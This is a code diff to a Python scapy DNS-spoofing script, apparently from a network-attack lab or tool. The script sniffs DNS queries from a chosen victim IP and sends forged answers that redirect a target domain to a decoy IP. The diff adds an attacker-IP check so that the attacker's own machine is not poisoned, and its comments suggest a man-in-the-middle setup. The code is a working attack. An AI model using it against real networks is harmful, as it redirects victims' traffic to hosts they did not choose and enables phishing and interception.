@@ -1,6 +1,7 @@
 from scapy.layers.inet import IP, UDP
 from scapy.layers.dns import DNS, DNSQR, DNSRR
-from scapy.all import send, sniff
+from scapy.layers.l2 import get_if_addr
+from scapy.all import send, sniff, conf
 import signal
 import ipaddress
 
@@ -15,6 +16,7 @@ import ipaddress
 # Employ the MitM to improve the timing reliability. Also as an extra add can be
 # to have your machine be used as a Gateway by allowing IP forwarding
 
+ATTACKER_IP=""
 VICTIM_IP=""
 SPOOF_DOMAIN=""  ## Global holder to set the target domain to redirect resolv from
 SPOOF_IP=""  ## Global holder to set the IP to redirect to, preferably a decoy host
@@ -27,14 +29,14 @@ def is_valid_ip(target):
     return False
 
 def process_packet(packet):
+  # This condition could be changed to allow all but our machine's IP if we want to poison more
+  # Safeguard the poison for our own machine
+  if packet[IP].src == VICTIM_IP and packet[IP].src != ATTACKER_IP:
   # Check if the packet is a DNS query
-  if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
-    dns_query = packet[DNSQR].qname.decode()
-    print(f"Intercepted DNS request for: {dns_query}")
+    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
+      dns_query = packet[DNSQR].qname.decode()
+      print(f"Intercepted DNS request for: {dns_query}")
 
-
-    # This condition could be changed to allow all but our machine's IP if we want to poison more
-    if packet[IP].src == VICTIM_IP:
       # Check if the query matches the target domain
       if SPOOF_DOMAIN in dns_query:
         # Craft a spoofed DNS response
@@ -48,10 +50,14 @@ def process_packet(packet):
         print(f"Sent spoofed response: {dns_query} -> {SPOOF_IP}")
 
 def main(in_victim_ip, in_spoof_domain, in_spoof_ip):
+  global ATTACKER_IP
   global VICTIM_IP
   global SPOOF_DOMAIN
   global SPOOF_IP
 
+  ## Can become issues perhaps if we have both IPv4 and IPv6
+
+  ATTACKER_IP = get_if_addr(conf.iface)
   VICTIM_IP = in_victim_ip
   SPOOF_DOMAIN = in_spoof_domain
   SPOOF_IP = in_spoof_ip
